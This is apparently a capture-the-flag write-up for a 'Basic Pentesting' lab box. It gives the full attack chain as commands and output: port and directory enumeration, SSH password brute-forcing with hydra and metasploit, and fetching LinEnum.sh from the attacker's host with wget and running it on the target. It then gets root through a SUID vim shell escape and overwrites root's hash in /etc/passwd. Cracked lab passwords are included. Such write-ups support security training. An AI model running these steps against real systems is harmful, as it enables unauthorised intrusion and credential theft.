# BASIC PENTESTING

```
export IP=10.10.126.249
```

```
nmap -sC -sV -oN nmap.out $IP 
```

open ports (nmap.out):
```
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       syn-ack Apache Jserv (Protocol v1.3)
8080/tcp open  http        syn-ack Apache Tomcat 9.0.7
```

```
gobuster dir -u $IP -w /opt/dirbuster/directory-list-2.3-medium.txt -x php,py,html,css,cgi,txt,js -o gobuster.out
```
directories (gobuster.out):
```
/.html                (Status: 403) [Size: 293]
/index.html           (Status: 200) [Size: 158]
/development          (Status: 301) [Size: 320] [--> http://10.10.100.203/development/]                               
```

```
gobuster dir -u $IP:8080 -w /opt/dirbuster/directory-list-2.3-medium.txt -x php,py,html,css,cgi,txt,js -o gobuster8080.out
```
directories (gobuster8080.out):
```
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/tomcat.css           (Status: 200) [Size: 5581]
```

```
/opt/enum4linux/enum4linux.pl -a $IP | tee enum4linux.out
```
users (enum4linux.out):
```
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

```
nikto -h $IP | tee nikto.out
```
nikto.out:
```
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 9e, size: 56a870fbc8f28, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /development/: Directory indexing found.
+ /development/: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8074 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-09-10 15:05:00 (GMT-3) (2736 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

metasploit:
```
grep login search ssh
use 49
set RHOSTS 10.10.126.249
set user_pass /opt/seclists/Passwords/Common-Credentials/10k-most-common.txt
run
```

hydra:
```
hydra -l jan -P /opt/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://10.10.126.249   
```
```
hydra -l kay -P /opt/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://10.10.126.249   
```

results:
```
[22][ssh] host: 10.10.126.249   login: jan   password: armando  

(kay's password still not found)
```
login into jan's system:
```
ssh jan@$IP
armando
```
open a server, upload LinEnum.sh from your machine and download it in the target machine:

```
python3 -m http.server 3333
``` 
```
cd /tmp/
wget http://my_ip:3333//LinEnum.sh
chmod 777 LinEnum.sh
./LinEnum.sh
```

Basic.Vim is listed as SUID. Open Vim and enter !sh to open a shell with root privileges, then generate a new password and replace root's password in /etc/passwd:

```
openssl passwd -1 -salt root 123
vim /etc/passwd
su root
123
```
now, as root, go to home/kay and read the "pass.bak" file

```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```